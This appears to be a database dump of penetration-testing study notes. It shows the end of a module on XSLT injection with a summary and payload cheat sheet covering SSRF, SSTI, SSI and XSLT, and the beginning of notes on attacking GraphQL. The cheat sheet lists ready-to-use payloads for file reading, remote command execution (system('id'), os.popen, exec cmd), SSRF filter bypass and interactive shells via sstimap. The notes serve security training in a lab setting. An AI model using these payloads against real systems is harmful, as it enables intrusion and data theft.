    Banana (Yellow)
    Strawberry (Red)
```

**A filtered, sorted XSLT** — all medium-size fruits, ordered by color descending — using `<xsl:sort>` and `<xsl:if>`:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all fruits of medium size ordered by their color:
        <xsl:for-each select="fruit">
            <xsl:sort select="color" order="descending" />
            <xsl:if test="size = ''Medium''">
                <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
            </xsl:if>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

Output:

```txt
Here are all fruits of medium size ordered by their color:
    Banana (Yellow)
    Apple (Red)
```

Because XSLT can generate arbitrary output strings, web applications often use it to embed XML data within an HTML response — which is exactly where injection becomes possible.

---

## 5.3 XSLT Injection Explained

As the name suggests, XSLT injection occurs whenever user input is inserted into XSL data **before** the XSLT processor generates its output. Because the processor executes whatever XSL elements it finds, an attacker who can inject their own XSL elements will have those elements executed during the output-generation process. This is the same root cause as every other vulnerability in this module — untrusted input reaching a powerful processor without sanitization — just applied to XSLT transformations. The practical impact depends heavily on the XSLT **version** supported by the processor and on its **configuration**, in particular whether it permits calling external functions (such as PHP functions), which is what unlocks file reading and command execution.

**Why version and configuration matter so much.** XSLT comes in different versions (1.0, 2.0, 3.0), and functions available in one may not exist in another — for example `unparsed-text` for reading files only exists from 2.0 onward, so against a 1.0 processor you must find another route. Separately, many XSLT libraries can be *extended* to call functions from the host language (PHP, Java, .NET). When those external functions are enabled, XSLT injection escalates from "inject some XSL elements" to "call `file_get_contents` and `system`," i.e. full file read and RCE. When they''re disabled, your impact is usually limited to what native XSLT functions allow. This is why the first thing you do after confirming injection is fingerprint the processor and version (section 5.5).

---

## 5.4 Identifying XSLT Injection

To find XSLT injection, look for a feature where your input is reflected into output that is backed by XML data and rendered via XSLT. In the sample web application, a page displays basic information about some HTB Academy modules (titles, authors, tiers), and at the bottom there''s a form to provide a username that gets inserted into a headline above the list. Since your name is reflected on the page, and the app likely stores module info in XML and renders it with XSLT, it may be vulnerable if your name is inserted without sanitization before the XSLT processing happens.

**Step 1 — Confirm with a broken XML character.** Provide the username `<` to break the XML/XSL syntax and provoke an error:

```
<
```

If the application responds with a **500 Internal Server Error**, that doesn''t definitively prove XSLT injection, but it indicates a likely security issue — your input is probably landing in the XSL data before processing. The next step moves from "suspicious error" to "confirmed execution."

**Why a lone `<` is a good probe.** In XML and XSL, `<` opens a tag, so injecting a single `<` with nothing valid after it almost always produces malformed XML — and a well-behaved XSLT processor throws a parse error, surfacing as a `500`. It''s the XSLT equivalent of injecting a single quote into a SQL query: a minimal character with special structural meaning that breaks syntax cheaply. Just like with SQLi, an error alone isn''t proof (the `500` could come from something else), which is why you immediately follow up with a payload that, if executed, returns attacker-visible output — the `system-property` queries in the next subsection. Reflected output from those queries is what turns suspicion into confirmation.

---

## 5.5 Information Disclosure

The cleanest way to *confirm* XSLT injection (rather than just suspect it) is to inject XSL elements that read **system properties** of the XSLT processor. If the application interprets and reflects these back, it proves your injected XSL elements are being executed — and as a bonus, it fingerprints the processor and version, which tells you what later payloads will work.

**Step 1 — Inject system-property queries to fingerprint the processor:**

```xml
Version: <xsl:value-of select="system-property(''xsl:version'')" />
<br/>
Vendor: <xsl:value-of select="system-property(''xsl:vendor'')" />
<br/>
Vendor URL: <xsl:value-of select="system-property(''xsl:vendor-url'')" />
<br/>
Product Name: <xsl:value-of select="system-property(''xsl:product-name'')" />
<br/>
Product Version: <xsl:value-of select="system-property(''xsl:product-version'')" />
```

If the web application returns the actual version and vendor details, your XSL elements executed — **XSLT injection confirmed**. In the sample, this reveals the app relies on the **libxslt** library and supports **XSLT version 1.0**. That version number matters a lot for the next step, because some file-reading functions only exist in XSLT 2.0.

---

## 5.6 Local File Inclusion

With XSLT injection confirmed, you can try to read local files — but *which* technique works depends on the XSLT version and the library''s configuration. XSLT 2.0 includes a function called `unparsed-text` for reading files, but it was only introduced in version 2.0, so against the sample app (XSLT 1.0) it simply returns an error. The alternative, available when the XSLT library is configured to support PHP functions, is to call PHP''s `file_get_contents` directly.

**Step 1 — Try the XSLT 2.0 native function** (fails on 1.0, worth knowing):

```xml
<xsl:value-of select="unparsed-text(''/etc/passwd'', ''utf-8'')" />
```

On an XSLT 1.0 processor like the sample''s, this is unsupported and errors out.

**Step 2 — Use PHP''s `file_get_contents` if PHP functions are enabled:**

```xml
<xsl:value-of select="php:function(''file_get_contents'',''/etc/passwd'')" />
```

The sample app is configured to support PHP functions, so this returns the contents of `/etc/passwd` in the response. Swap the path to read source code or configuration files.

---

## 5.7 Remote Code Execution

If the XSLT processor supports PHP functions, you can go beyond reading files and achieve full remote code execution by calling a PHP function that runs a system command. This is the same `php:function(...)` mechanism as the LFI step, but pointed at a command-execution function like `system` instead of a file-reading one.

**Step 1 — Execute a command via PHP''s `system`:**

```xml
<xsl:value-of select="php:function(''system'',''id'')" />
```

The output of `id` appears in the response, confirming RCE. Replace `id` with any command to run arbitrary code as the web server''s user. Combined with the LFI from the previous step, this makes an XSLT injection with PHP functions enabled just as dangerous as the other RCE vulnerabilities in this module.

---

## 5.8 Preventing XSLT Injection

As with every injection vulnerability in this module, XSLT injection is prevented by ensuring that **user input is not inserted into XSL data before it is processed** by the XSLT processor. However, applications often genuinely need the output to reflect user-provided values, which means that data must be added to the XSL document before processing. In that case, it is essential to implement proper **sanitization and input validation** to prevent attackers from injecting additional XSLT elements — though the exact implementation depends on the output format.

For example, if the XSLT processor generates an **HTML** response, **HTML-encoding** user input before inserting it into the XSL data prevents XSLT injection: HTML-encoding converts every `<` to `&lt;` and `>` to `&gt;`, so an attacker cannot inject the `<xsl:...>` elements the attack requires. On top of input handling, several **hardening measures** reduce the impact of any injection that slips through.

Key measures:

- **Don''t insert user input** into XSL data before processing; if you must, **sanitize and validate** it.
- **HTML-encode** user input (`<` → `&lt;`, `>` → `&gt;`) when the output is HTML, to block injected XSL elements.
- **Run the XSLT processor as a low-privilege process**, limiting the damage of a successful attack.
- **Disable external/PHP functions** within XSLT, removing the file-read and RCE paths.
- **Keep the XSLT library up to date** to benefit from security fixes.

---

### Documentation Example (CTF-style write-up)

> **Finding:** XSLT injection in the username field → information disclosure, LFI, and RCE (libxslt 1.0, PHP functions enabled).
>
> **Reproduction:**
> ```xml
> <!-- 1. Confirm (broken tag) -->
> name = <                                   <!-- 500 Internal Server Error -->
>
> <!-- 2. Fingerprint / confirm execution -->
> <xsl:value-of select="system-property(''xsl:version'')" />   <!-- 1.0 -->
> <xsl:value-of select="system-property(''xsl:vendor'')" />    <!-- libxslt -->
>
> <!-- 3. LFI (XSLT 2.0 native fails; PHP function works) -->
> <xsl:value-of select="php:function(''file_get_contents'',''/etc/passwd'')" />
>
> <!-- 4. RCE -->
> <xsl:value-of select="php:function(''system'',''id'')" />
> ```
>
> **Evidence / Notes:** The username is inserted into XSL data before the transformation runs. A broken tag produced a `500`; `system-property` queries confirmed execution and fingerprinted libxslt/XSLT 1.0; `file_get_contents` read `/etc/passwd`; `system(''id'')` executed a command. Impact: file disclosure + RCE. **Severity: Critical.** Fix: HTML-encode user input and disable PHP functions in the XSLT processor.
>
> **Screenshot placeholder:** `[ Attach version/vendor disclosure + /etc/passwd + id output ]`

---

# 6. Module Summary & Attacker Methodology

---

You now have a complete, detailed picture of the four main server-side vulnerability classes, how each one works under the hood, and how they connect to one another. The table below consolidates the whole module into a single reference.

| Class | Confirm | Fingerprint | Escalate to |
|-------|---------|-------------|-------------|
| **SSRF** | Callback to your listener | Reflected (non-blind) vs generic error (blind) | Port scan, restricted endpoints, `file://` LFI, `gopher://` to internal services |
| **SSTI** | `${{<%[%''"}}%\.` → error | `${7*7}`, `{{7*7}}`, `{{7*''7''}}` → Jinja vs Twig | Config dump → LFI → RCE (`os.popen` / `filter(''system'')`) |
| **SSI Injection** | `<!--#printenv -->` executes | `.shtml`/`.stm` extension + directive runs | `<!--#exec cmd="..." -->` command execution |
| **XSLT Injection** | `<` → `500`; `system-property` runs | libxslt / XSLT version via `system-property` | `php:function(''file_get_contents'',...)` LFI → `php:function(''system'',...)` RCE |

**SSRF** abuses the server''s ability to make requests. It lets you scan the internal network, reach firewalled endpoints the server trusts, read local files with the `file://` scheme, and — most powerfully — forge raw requests to arbitrary internal services with `gopher://`. Even a *blind* SSRF, where you can''t see the response, still enables port and file enumeration and lets you fire payloads blindly at internal apps.

**SSTI** abuses template rendering. The whole vulnerability comes down to user input reaching the *template string* rather than staying a safe *value*. Once confirmed and fingerprinted (Jinja vs Twig via `{{7*''7''}}`), you escalate from information disclosure through local file reading up to full remote code execution — `os.popen` in Jinja, `filter(''system'')` in Twig — and SSTImap can automate the whole chain.

**SSI injection** abuses server-side include directives embedded in HTML. Confirm safely with `<!--#printenv -->`, then a single `<!--#exec cmd="..." -->` directive gives you command execution and server takeover.

**XSLT injection** abuses XML transformations. Confirm with a broken tag and `system-property` queries, then — if the processor allows PHP functions — read files with `file_get_contents` and run commands with `system`, reaching the same RCE as the others.

**The thread that ties all four together** is identical and worth committing to memory: *untrusted user input reaching a powerful server-side feature without sanitization.* The defenses rhyme too — strict input validation, allowlisting over denylisting, least privilege, disabling dangerous functionality, and isolating risky components — and the attacker''s workflow never changes: **confirm the vulnerability, fingerprint the technology, escalate carefully from low to high impact, and document every step with clean reproduction and solid evidence.** Master that loop and you can approach any server-side vulnerability, even one you''ve never seen before, with a clear plan.

---

# 7. Appendix — Payload Quick Reference

---

This appendix collects the key payloads from the whole module into copy-ready cheat sheets, grouped by vulnerability. Treat it as a field reference once you already understand *why* each payload works from the sections above — the explanations there are what matter in an exam or a real engagement; these tables are just for speed.

## 7.1 SSRF Quick Reference

```text
# Confirm (out-of-band callback)
dateserver=http://<YOUR_IP>:8000/ssrf          + nc -lnvp 8000

# Non-blind check (reflects app''s own HTML)
dateserver=http://127.0.0.1/index.php

# Internal port scan (ffuf)
seq 1 10000 > ports.txt
ffuf -w ports.txt -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

# Restricted endpoint discovery
dateserver=http://dateserver.htb/FUZZ.php      (-fr "Server at dateserver.htb Port 80")

# LFI via file://
dateserver=file:///etc/passwd

# gopher (raw POST) — build, URL-encode twice, then place in parameter
gopher://host:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0A...%0D%0A%0D%0Aadminpw%3Dadmin

# gopher generator
python2.7 gopherus.py --exploit smtp|mysql|redis|fastcgi|postgresql|zabbix

# Denylist bypass representations of 127.0.0.1
http://127.0.0.2/   http://127.1/   http://2130706433/   http://0177.0.0.1/
http://0x7f.0.0.1/  http://[::1]/   http://localtest.me/
```

## 7.2 SSTI Quick Reference

```text
# Confirm (universal probe — expect an error)
${{<%[%''"}}%\.

# Fingerprint
${7*7}      -> evaluates?  follow "success" branch
{{7*7}}     -> 49?         Jinja/Twig family
{{7*''7''}}   -> 7777777 = Jinja   |   49 = Twig

# --- Jinja (Flask/Django) ---
{{ config.items() }}                                                   # config dump
{{ self.__init__.__globals__.__builtins__ }}                          # built-ins
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}             # LFI
{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}    # RCE
{{ lipsum.__globals__.os.popen(''id'').read() }}                        # RCE (alt)
{{ cycler.__init__.__globals__.os.popen(''id'').read() }}               # RCE (alt)

# --- Twig (PHP/Symfony) ---
{{ _self }}                                                           # info
{{ "/etc/passwd"|file_excerpt(1,-1) }}                                # LFI (Symfony)
{{ [''id''] | filter(''system'') }}                                       # RCE

# --- Automation ---
python3 sstimap.py -u "http://TARGET/index.php?name=test"             # detect
python3 sstimap.py -u "...?name=test" -S id                           # run command
python3 sstimap.py -u "...?name=test" -D ''/etc/passwd'' ''./passwd''     # download file
python3 sstimap.py -u "...?name=test" --os-shell                      # interactive shell
```

## 7.3 SSI Injection Quick Reference

```text
<!--#printenv -->                        # confirm (prints env vars)
<!--#exec cmd="id" -->                   # RCE
<!--#echo var="DOCUMENT_NAME" -->        # echo a variable
<!--#include virtual="index.html" -->    # include a web-root file
<!--#config errmsg="Error!" -->          # change SSI error message

# Extensions that hint SSI: .shtml  .shtm  .stm  (but can be configured for any)
```

## 7.4 XSLT Injection Quick Reference

```text
# Confirm
name = <                                        # broken tag -> 500 error

# Fingerprint / confirm execution
<xsl:value-of select="system-property(''xsl:version'')" />
<xsl:value-of select="system-property(''xsl:vendor'')" />

# LFI
<xsl:value-of select="unparsed-text(''/etc/passwd'',''utf-8'')" />             # XSLT 2.0 only
<xsl:value-of select="php:function(''file_get_contents'',''/etc/passwd'')" />  # PHP funcs on

# RCE
<xsl:value-of select="php:function(''system'',''id'')" />                      # PHP funcs on
```

## 7.5 One-Line Defense Summary

| Vulnerability | Primary defense | Key hardening |
|---------------|-----------------|---------------|
| SSRF | Allowlist origins + restrict schemes | Firewall outbound requests, network segmentation |
| SSTI | Keep user input as *values*, never in the template | Sandbox / isolate the engine in a container |
| SSI Injection | Sanitize input written to served files | Restrict SSI to set extensions, disable `exec` |
| XSLT Injection | Don''t put input in XSL pre-processing; HTML-encode | Disable PHP functions, low-priv processor, patch libxslt |

---

*End of notes.*', NULL, 'PUBLISHED', 'PUBLIC', 65, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792500821.627), to_timestamp(1792500821.627), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvgzdl4y005fidhwt46ecs8s', 'Attacking GraphQL', 'attacking-graphql', 'Full GraphQL attack workflow — fingerprinting with graphw00f, schema enumeration via introspection, IDOR, UNION-based SQL injection, DoS and batching abuse, and privilege escalation through mutations — with step-by-step commands, payloads, and prevention notes.', '# Attacking GraphQL — Structured Notes

---

## Table of Contents

**1. Introduction to GraphQL**

- 1.1 Basic Overview
  - 1.1.1 Querying Fields and Objects
  - 1.1.2 Arguments
  - 1.1.3 Sub-Querying (Nested Objects)

---

**2. Information Disclosure**

- 2.1 Identifying the GraphQL Engine
  - 2.1.1 Running graphw00f
  - 2.1.2 GraphiQL Interface
- 2.2 Introspection
  - 2.2.1 Listing All Types
  - 2.2.2 Listing a Type''s Fields
  - 2.2.3 Listing All Supported Queries
  - 2.2.4 Full Introspection Query
  - 2.2.5 Visualizing with GraphQL-Voyager

---

**3. Insecure Direct Object Reference (IDOR)**

- 3.1 Identifying IDOR
- 3.2 Exploiting IDOR

---

**4. Injection Attacks**

- 4.1 SQL Injection
  - 4.1.1 Finding Queries That Take Arguments
  - 4.1.2 Confirming the Vulnerability
  - 4.1.3 UNION-Based Exfiltration
- 4.2 Cross-Site Scripting (XSS)

---

**5. Denial-of-Service (DoS) & Batching Attacks**

- 5.1 Denial-of-Service (DoS) Attacks
- 5.2 Batching Attacks

---

**6. Mutations**

- 6.1 What Are Mutations?
  - 6.1.1 Enumerating Mutations
  - 6.1.2 Enumerating Input Fields
  - 6.1.3 Registering a New User
- 6.2 Exploitation with Mutations (Privilege Escalation)

---

**7. Tools of the Trade**

- 7.1 GraphQL-Cop
- 7.2 InQL

---

**8. GraphQL Vulnerability Prevention**

- 8.1 Information Disclosure
- 8.2 Injection Attacks
- 8.3 Denial-of-Service (DoS)
- 8.4 API Design

---

**9. Quick Reference & Glossary**

- 9.1 GraphQL vs REST (Key Differences)
- 9.2 Core Terms Glossary
- 9.3 Attack-by-Attack Cheat Sheet
- 9.4 Command Reference
- 9.5 Testing Methodology Checklist

---

## Section 1: Introduction to GraphQL

GraphQL is a query language typically used by web APIs as an alternative to REST. It lets the client fetch exactly the data it needs through a simple syntax, while offering many features common to query languages like SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. The big difference is that GraphQL APIs are usually implemented on a **single endpoint** that handles all queries. This gives GraphQL its main benefit over REST: more efficient resource use and request handling.

A GraphQL service normally runs on one endpoint to receive queries — most commonly `/graphql`, `/api/graphql`, or a similar URL. The frontend web app needs this endpoint exposed to use it, which means we (as testers) can also talk to the GraphQL endpoint **directly**, without going through the frontend, to hunt for security vulnerabilities. This direct access is what makes GraphQL enumeration so powerful.

Common endpoint paths worth checking when we do not yet know where the API lives include `/graphql`, `/api/graphql`, `/graphql/console`, `/graphiql`, `/v1/graphql`, `/query`, and `/api`. A quick way to confirm any candidate is to send the simplest possible valid query and watch for a GraphQL-shaped response — a JSON object with a top-level `data` or `errors` key. For example, `curl -s http://TARGET/graphql -H "Content-Type: application/json" -d ''{"query":"{__typename}"}''` returns `{"data":{"__typename":"Query"}}` on a live GraphQL endpoint, because `__typename` is a universal meta-field every GraphQL type answers. That single reply both confirms the path and tells us the root query type''s name.

To make this concrete before the details: in a REST API, reading a user, their posts, and each post''s comments might take three separate requests to three separate URLs. In GraphQL, you describe that whole shape in one query to one endpoint and the server returns exactly that tree of data. This "ask for the shape you want" model is convenient for developers, but it also means a single crafted request can reach deep into the backend — which is why nested-query DoS and over-fetching of sensitive fields become real risks. Keeping this mental model in mind helps explain why every attack in this module targets either the **query structure** or the **arguments** inside it.

### Basic Overview

A GraphQL request is just an HTTP request (usually `POST`) whose body carries a `query` written in GraphQL syntax. The server parses that query, resolves each requested field by calling backend "resolver" functions, and returns a JSON response mirroring the query''s shape. As testers, the two things we care about most are: (1) which **fields** exist on each type (because fields like `password` may be exposed), and (2) which **arguments** a query accepts (because arguments are where user input flows into backend code and databases). Everything in the rest of this module builds on those two ideas.

#### Querying Fields and Objects

From an abstract view, GraphQL queries select **fields** of objects. Each object has a specific **type** defined by the backend, and the query is structured with the name of the **query** to run at the root. For example, to query the `id`, `username`, and `role` fields of all `User` objects, we run the `users` query:

```graphql
{
  users {
    id
    username
    role
  }
}
```

Reading this query top to bottom: the outer `{ ... }` is the request body, `users` is the root query we are calling, and the inner `{ id username role }` is the **selection set** — the exact list of fields we want back. If we leave a field out, we do not get it; if we add a field the type does not have, the server returns an error naming the valid fields. That error behavior is itself useful during enumeration, because it leaks the schema one mistake at a time.

The response is structured the same way as the query — you ask for certain fields and get exactly those fields back:

```graphql
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

Notice the response is wrapped in a top-level `"data"` key. Successful results live under `data`; when something goes wrong, GraphQL adds a sibling `"errors"` array describing what failed. Watching both keys is important during testing: even a "failed" request often leaks schema details, type names, or SQL fragments inside the `errors` array, and that leakage is frequently the first crack we exploit.

#### Arguments

If a query supports **arguments**, we can add one to filter the results. For example, if `users` supports the `username` argument, we can query one specific user:

```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```

Arguments are written in parentheses right after the query (or field) name, as `name: value` pairs. They are the GraphQL equivalent of a function parameter or a URL query-string parameter in REST (`?username=admin`). This matters for security because an argument''s value is usually passed into a backend resolver, and from there possibly into a SQL query, an OS command, or an HTML response. That makes arguments the **primary injection surface** of a GraphQL API — which is exactly why Section 4 spends its time testing them.

We can freely add or remove fields we are interested in. For instance, if we do not care about `role` and instead want the user''s `password`, we adjust the query. This flexibility is also what makes GraphQL useful to an attacker — you can ask for sensitive fields directly:

```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}
```

The lesson here is subtle but important: in a REST API a developer controls exactly which fields each endpoint returns, but in GraphQL the **client** chooses the fields. If the backend exposes a `password` field on the `User` type and does not strip it in a resolver, any client that simply asks for `password` will receive it. This is why over-exposed fields are so common in GraphQL and why one of our first enumeration steps is always to list a type''s fields and look for sensitive ones.

#### Sub-Querying (Nested Objects)

GraphQL queries support **sub-querying**, which lets a query pull details from an object that references another object. For example, if a `posts` query returns an `author` field holding a user object, we can query the author''s `username` and `role` inside the same query:

```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

Sub-querying (also called nesting) is where GraphQL''s power — and its danger — really shows. In one request we traverse a relationship: from a post, to its author, to that author''s fields. There is no fixed limit to how deep this can go unless the backend enforces one. When two types reference **each other** (a post has an author, and an author has posts), that nesting can form a loop, and a loop that we repeat many times is exactly how the Denial-of-Service attack in Section 5 works. So this innocent-looking feature is worth remembering.

The result contains the `title` of all posts plus the queried data of each corresponding author. This nesting ability becomes important later — it is exactly what we abuse for Denial-of-Service attacks:

```graphql
{
  "data": {
    "posts": [
      {
        "title": "Hello World!",
        "author": {
          "username": "htb-stdnt",
          "role": "user"
        }
      },
      {
        "title": "Test",
        "author": {
          "username": "test",
          "role": "user"
        }
      }
    ]
  }
}
```

GraphQL supports much more complex operations, but this overview is enough for the module. The three ideas to carry forward are: **selection sets** (we choose the fields), **arguments** (our input surface for injection), and **nesting** (our lever for depth-based abuse). Nearly every attack technique that follows is an application of one of these three.

---

## Section 2: Information Disclosure

Exploiting any service requires thorough enumeration and reconnaissance to identify all possible attack vectors. As attackers, we aim to obtain as much information about a service as possible. With GraphQL, enumeration is especially rewarding because the API can be made to describe its own entire structure.

This self-describing quality is unique to GraphQL. With a REST API, we normally guess endpoint names, brute-force paths, and read documentation we may not have. With GraphQL, the server itself can hand us a complete map of every type, field, query, and mutation through a feature called **introspection**. When introspection is enabled (and it often is, because many engines enable it by default), reconnaissance stops being guesswork and becomes a single query. The rest of this section walks through fingerprinting the engine first, then pulling that map apart piece by piece.

### Identifying the GraphQL Engine

After logging in to the sample web application and investigating all functionality, we can observe multiple requests to the `/graphql` endpoint that contain GraphQL queries (for example, a `posts` query returning `uuid`, `title`, `body`, `category`, and the `author`''s `username`). Seeing these requests confirms the web app implements GraphQL. As a first step, we identify the GraphQL engine using the tool **graphw00f**. Graphw00f sends various GraphQL queries — including malformed ones — and determines the engine by observing the backend''s behavior and error messages in response.

Knowing the **engine** (the specific GraphQL server implementation, such as Graphene, Apollo, or graphql-php) matters because each engine has its own default settings and its own known weaknesses. Some engines enable introspection and field suggestions by default; some allow batching out of the box; some are missing depth limits entirely. Fingerprinting the engine tells us, before we even test, which attacks are most likely to land — it turns a blind test into a targeted one. This is why engine identification is the very first recon step rather than an afterthought.

#### Running graphw00f

After cloning the git repository, we run the tool using the `main.py` Python script in fingerprint (`-f`) and detect (`-d`) mode. We give it the base URL and let graphw00f find the GraphQL endpoint itself:

```shellsession
python3 main.py -d -f -t http://172.17.0.2
```

Command explained step by step:
- `python3 main.py` runs graphw00f''s main script.
- `-d` enables **detect mode** — it hunts for the GraphQL endpoint (trying `/`, `/graphql`, etc.).
- `-f` enables **fingerprint mode** — it tries to identify which GraphQL engine is running.
- `-t http://172.17.0.2` is the **target** base URL.

Why run both `-d` and `-f` together: detect mode first locates the endpoint (we might not already know whether it lives at `/graphql`, `/api/graphql`, or elsewhere), and fingerprint mode then probes that located endpoint to name the engine. Running them in one command means we go from "I have an IP" to "I know the exact engine and its URL" in a single step. If we already knew the exact endpoint, we could point `-t` straight at it, but letting the tool discover it is safer because it also catches non-standard paths.

Example output:

```
[*] Checking http://172.17.0.2/
[*] Checking http://172.17.0.2/graphql
[!] Found GraphQL at http://172.17.0.2/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

Reading this output line by line: the `[*] Checking` lines show the paths graphw00f tried; the `[!] Found GraphQL at ...` line confirms the live endpoint; and the `[*] Discovered GraphQL Engine: (Graphene)` line is the payoff — the engine is **Graphene**, a Python implementation. The `[!] Technologies: Python` and homepage lines corroborate that, and the **Attack Surface Matrix** link is a jump-off point to the engine''s known weaknesses.

Graphw00f identified the engine **Graphene** and pointed us to its page in the **GraphQL-Threat-Matrix**, which gives deeper detail on the engine. For Graphene, that matrix notes that **Field Suggestions and Introspection are enabled by default**, while protections like Query Depth Limit, Query Cost Analysis, and Debug Mode are not supported, and Batch Requests are disabled by default. Knowing these defaults tells us which attacks are likely to work.

Translating those defaults into a plan: because **introspection is on by default**, we can expect the full-schema dump in the next subsection to succeed. Because **field suggestions are on**, misspelling a field name may make the server suggest the correct one, leaking schema details even without full introspection. Because there is **no query-depth limit**, the nested-loop DoS in Section 5 is viable. And because **batching is off by default**, batching attacks may require the feature to have been explicitly enabled — so we should test it rather than assume it. This is the practical value of fingerprinting: it pre-sorts our attack list into "likely" and "unlikely" before we spend time testing.

#### GraphiQL Interface

By accessing the `/graphql` endpoint directly in a web browser, we can see the web application runs a **GraphiQL** interface. This lets us type GraphQL queries directly in a friendly editor, which is far more convenient than sending them through Burp — we do not have to worry about breaking the surrounding JSON syntax. For the rest of enumeration, GraphiQL is the easiest place to work.

GraphiQL (note the capital **Q** and **L** — it is "graph-i-q-l," an in-browser IDE for GraphQL) usually offers autocomplete, inline documentation, and syntax highlighting, all driven by introspection. That means the mere presence of GraphiQL on a production server is itself a finding: it signals introspection is enabled and gives any visitor a guided tour of the schema. When writing queries in GraphiQL we type raw GraphQL (no JSON escaping), whereas in Burp Repeater the same query must be embedded inside a JSON body with escaped quotes. For exploratory enumeration GraphiQL wins on speed; for scripted or repeatable attacks (loops, automation, fuzzing) Burp or `curl` is better. A common workflow is to **discover** in GraphiQL, then **weaponize** the finished query in Burp or a script.

It helps to see the *same* operation in all three forms so switching between them is painless. The raw GraphQL (what we type in GraphiQL):

```graphql
{ user(username: "admin") { username role } }
```

The Burp/HTTP form, wrapped in a JSON body with the inner quotes escaped:

```http
POST /graphql HTTP/1.1
Host: TARGET
Content-Type: application/json

{"query":"{ user(username: \"admin\") { username role } }"}
```

And the `curl` form, where the shell adds yet another escaping layer:

```shellsession
curl -s http://TARGET/graphql -H "Content-Type: application/json" \
  -d ''{"query":"{ user(username: \"admin\") { username role } }"}''
```

Seeing them side by side makes the escaping rules obvious: GraphiQL = no escaping, JSON body = escape the GraphQL''s quotes, `curl` = wrap the JSON in single quotes so the shell leaves the double quotes alone. Most GraphQL-testing frustration comes from mixing these layers up, so keeping this three-form template handy saves real time.

### Introspection

Introspection is a GraphQL feature that lets users query the GraphQL API about the **structure of the backend system**. Using introspection queries, we can obtain every query, type, and field the API schema supports. These queries all target the special `__schema` field. Introspection is the single most valuable recon step against GraphQL, because it can reveal the entire schema — including fields the frontend never uses.

The special double-underscore fields (`__schema` and `__type`) are built into the GraphQL specification itself — they are "meta" fields that describe the API rather than return application data. Because they are part of the spec, every compliant engine understands them, which is why the same introspection queries work across different backends. The catch for defenders is that introspection was designed as a developer convenience (powering tools, docs, and autocomplete), but in production it hands attackers a blueprint. We will pull that blueprint apart in increasing detail: first all type names, then one type''s fields, then all queries, then everything at once.

#### Listing All Types

We can identify all GraphQL types supported by the backend with this query:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

This is the lightest-weight introspection query and a good first probe, because it returns only `name` for every type — enough to see what exists without drowning us in detail. If this query succeeds, introspection is enabled and we can go deeper; if it is blocked, we may need to fall back on field suggestions or documented queries. Reading the result, we mentally filter out the built-in scalars (`Int`, `String`, `Boolean`, `Float`, `ID`) and the introspection meta-types (names starting with `__`), because the interesting items are the **custom** application types.

The results contain default types (such as `Int` or `Boolean`) and all **custom types**, such as `UserObject`, `PostObjectConnection`, and `PageInfo`. Custom types are the interesting ones — they map to real application data. A name like `UserObject` almost always corresponds to a `users` table or a user model, and `PostObjectConnection` hints at a paginated relationship (the word "Connection" is a GraphQL convention for a list that supports paging via `edges` and `node`). Spotting `UserObject` immediately tells us where to look next: list its fields and check for anything sensitive.

#### Listing a Type''s Fields

Once we know a type, we can get the name and data type of all its fields with this introspection query:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

Here we switch from `__schema` (the whole API) to `__type(name: "...")` (one specific type). We ask for each field''s `name` plus its `type { name kind }`. The `kind` tells us the category of the type — `SCALAR` for primitives like `String` or `Int`, `OBJECT` for nested objects, `LIST` for arrays, and `NON_NULL` for required values. Knowing the kind matters later: for SQL injection we count the **scalar** fields to work out how many UNION columns we need, and for nesting attacks we look for `OBJECT`/`LIST` fields that point back to other types.

In the result we see details we would expect from a user object, such as `username` and `password`, along with their data types (both `String`, kind `SCALAR`). Spotting a `password` field here is an immediate red flag worth exploiting. Finding a `password` field on a `User` type is one of the most valuable outcomes of enumeration, because it means that **if** any query returns a `UserObject` without stripping that field, we can read it directly — no cracking required. It is this exact finding that powers the IDOR attack in Section 3 (read another user''s password) and shapes the SQL injection payload in Section 4 (reflect data through the `username` field).

#### Listing All Supported Queries

We can obtain all queries supported by the backend with this query:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

Where the previous queries mapped **types** (the data shapes), this one maps **queries** (the entry points we can actually call). `queryType` is the root type that holds every top-level query, and asking for its `fields` returns the callable query names plus any developer-written `description`. Those descriptions are a bonus: developers sometimes explain exactly what a query does ("returns a user by username," "admin-only report"), which hands us both the attack surface and hints about which queries are sensitive.

